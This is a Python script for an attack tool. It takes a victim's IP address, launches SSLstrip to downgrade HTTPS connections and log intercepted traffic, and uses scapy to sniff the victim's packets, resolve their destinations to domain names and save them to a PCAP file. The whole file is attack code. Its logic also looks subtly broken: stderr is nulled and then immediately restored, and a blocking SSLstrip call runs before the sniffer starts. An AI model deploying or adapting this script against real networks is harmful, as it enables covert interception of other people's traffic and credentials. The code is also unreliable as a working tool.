#!/usr/bin/env python

import sys
import argparse
import sslstrip
import time
from scapy.all import *
import socket

sys.stderr = None 
sys.stderr = sys.__stderr__

def resolve_ip_to_domain(ip):
    try:
        domain = socket.gethostbyaddr(ip)[0]
        return domain
    except socket.herror:
        return None

def process_packet(packet):
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        
        if src_ip == victim_ip or dst_ip == victim_ip:
            domain = resolve_ip_to_domain(dst_ip)
            if domain:
                print(f"Packet: {src_ip} -> {dst_ip} (Domain: {domain})")
            else:
                print(f"Packet: {src_ip} -> {dst_ip} (Domain: Unknown)")

def run_sslstrip(interface):
    # start SSLstrip
    print("Starting SSLstrip on interface {}".format(interface))
    sslstrip.main(["sslstrip", "-l", "10000", "-w", "sslstrip.log"])

def sniffer(interface, bpf_filter, output_file, tap_device):
    # create the sniffer
    if tap_device:
        # use a network tap to capture all traffic on the segment
        sniffer = AsyncSniffer(iface=tap_device, filter=bpf_filter, prn=process_packet)
    else:
        # capture only traffic to or from the host
        sniffer = AsyncSniffer(iface=interface, filter=bpf_filter, prn=process_packet)

    # start sniffing
    print("Starting sniffer on interface {}".format(interface))
    if output_file:
        print("Writing packets to {}".format(output_file))
    sniffer.start()

    # wait for Ctrl-C
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping sniffer")

    # stop sniffing and write packets to file if specified
    sniffer.stop()
    if output_file:
        wrpcap(output_file, sniffer.results)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("victim_ip", help="IP address of the victim")
    parser.add_argument("-i", "--interface", help="Network interface to sniff on", required=True)
    parser.add_argument("-f", "--filter", help="BPF filter to apply")
    parser.add_argument("-o", "--output", help="Output file to save packets to (PCAP format)")
    parser.add_argument("-t", "--tap", help="Network tap device to use")
    args = parser.parse_args()

    global victim_ip
    victim_ip = args.victim_ip
    print("Sniffing traffic for:", victim_ip)

    if args.tap:
        run_sslstrip(args.interface)
    sniffer(args.interface, args.filter, args.output, args.tap)

if __name__ == "__main__":
    main()